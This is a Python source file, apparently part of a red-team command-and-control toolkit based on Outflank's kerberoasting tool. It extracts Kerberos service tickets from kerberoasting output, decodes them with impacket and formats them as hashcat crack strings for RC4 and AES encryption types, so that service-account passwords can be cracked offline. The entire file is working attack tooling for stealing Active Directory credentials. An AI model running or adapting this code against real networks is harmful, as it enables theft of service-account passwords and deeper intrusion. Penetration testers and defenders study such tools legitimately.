# Based on https://github.com/outflanknl/C2-Tool-Collection/blob/main/BOF/Kerberoast/TicketToHashcat.py

import base64
import re

from impacket.krb5 import constants
from impacket.krb5.asn1 import AP_REQ
from pyasn1.codec.ber import decoder


class TicketConverter:
    @staticmethod
    def convert_ticket(ticket):
        """
        Decoded the kerberos tickets from outflank's kerberoasting BOF.
        Refactored to make the decode usable in other projects.

        Return tuple of: hash_type, secret, system, purpose
        """
        # Extract sAMAccountName and AP_REQ data
        extract = re.search(r'sAMAccountName = ([^\s]+)([^<]+)', ticket)
        if extract:
            sAMAccountName = extract.group(1).strip()
            # Base64 decode.
            dec = base64.b64decode(extract.group(2))
        else:
            print("Failed to extract data\n")
            return None, None

        # Find AP_REQ offset
        i = 0
        while(dec[i] != 0x6e):
            i += 1

        # Parse AP_REQ ticket
        ap_req = decoder.decode(dec[i:], asn1Spec=AP_REQ())[0]
        tgs_realm = ap_req['ticket']['realm']._value.capitalize()
        tgs_name_string_svc = ap_req['ticket']['sname']['name-string'][0]._value
        tgs_name_string_host = ap_req['ticket']['sname']['name-string'][1]._value
        tgs_encryption_type = ap_req['ticket']['enc-part']['etype']._value

        if tgs_encryption_type == constants.EncryptionTypes.rc4_hmac.value: # etype 23 (RC4)
            tgs_checksum = ap_req['ticket']['enc-part']['cipher']._value[:16].hex().upper()
            tgs_encrypted_data2 = ap_req['ticket']['enc-part']['cipher']._value[16:].hex().upper()

            hashcat = '$krb5tgs$%d$*%s$%s$%s/%s*$%s$%s\n' % (tgs_encryption_type, sAMAccountName, tgs_realm, tgs_name_string_svc, tgs_name_string_host, tgs_checksum, tgs_encrypted_data2)
            return 13100, hashcat, tgs_realm, f"{tgs_name_string_svc}/{tgs_name_string_host}"
        elif tgs_encryption_type == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value: # etype 17 (aes128)
            tgs_checksum = ap_req['ticket']['enc-part']['cipher']._value[-12:].hex().upper()
            tgs_encrypted_data2 = ap_req['ticket']['enc-part']['cipher']._value[:-12].hex().upper()

            hashcat = '$krb5tgs$%d$%s$%s$*%s/%s*$%s$%s\n' % (tgs_encryption_type, sAMAccountName, tgs_realm, tgs_name_string_svc, tgs_name_string_host, tgs_checksum, tgs_encrypted_data2)
            return 19600, hashcat, tgs_realm, f"{tgs_name_string_svc}/{tgs_name_string_host}"
        elif tgs_encryption_type == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value: # etype 18 (aes256)
            tgs_checksum = ap_req['ticket']['enc-part']['cipher']._value[-12:].hex().upper()
            tgs_encrypted_data2 = ap_req['ticket']['enc-part']['cipher']._value[:-12].hex().upper()

            hashcat = '$krb5tgs$%d$%s$%s$*%s/%s*$%s$%s\n' % (tgs_encryption_type, sAMAccountName, tgs_realm, tgs_name_string_svc, tgs_name_string_host, tgs_checksum, tgs_encrypted_data2)
            return 19700, hashcat, tgs_realm, f"{tgs_name_string_svc}/{tgs_name_string_host}"
